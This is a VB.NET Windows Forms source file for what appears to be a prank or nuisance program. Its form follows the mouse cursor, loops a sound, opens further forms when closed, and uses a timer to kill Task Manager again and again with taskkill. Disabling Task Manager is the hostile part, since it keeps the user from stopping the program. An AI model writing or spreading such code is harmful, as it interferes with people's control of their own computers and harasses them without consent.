Public Class Form1

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick



        Me.Location = New Point(Cursor.Position.X - 173, Cursor.Position.Y - 66)


    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Form4.Show()
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Me.Close()

    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Timer2.Enabled = False
        Me.Show()

    End Sub

    Private Sub Button1_Disposed(ByVal sender As Object, ByVal e As System.EventArgs) Handles Button1.Disposed
        Form2.Show()
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick

        My.Computer.Audio.Play(My.Resources.newspash,
              AudioPlayMode.Background)

        Label3.Text = Label3.Text + 1
        If Label3.Text = "44" Then
            Label3.Text = "0"
        End If
        Label2.Text = ListBox1.Items.Item(Label3.Text)
    End Sub

    Private Sub Label2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label2.Click

    End Sub

    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer4.Tick
        Process.Start("C:\Windows\System32\taskkill.exe", "/IM taskmgr.exe")
    End Sub

    Private Sub Timer5_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer5.Tick
        If TrackBar1.Value = 0 Then
            Label5.Text = 1
        End If
        If TrackBar1.Value = 100 Then
            Label5.Text = -1
        End If
        TrackBar1.Value = TrackBar1.Value + Label5.Text
    End Sub

    Private Sub TrackBar1_Scroll(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TrackBar1.Scroll

    End Sub
End Class
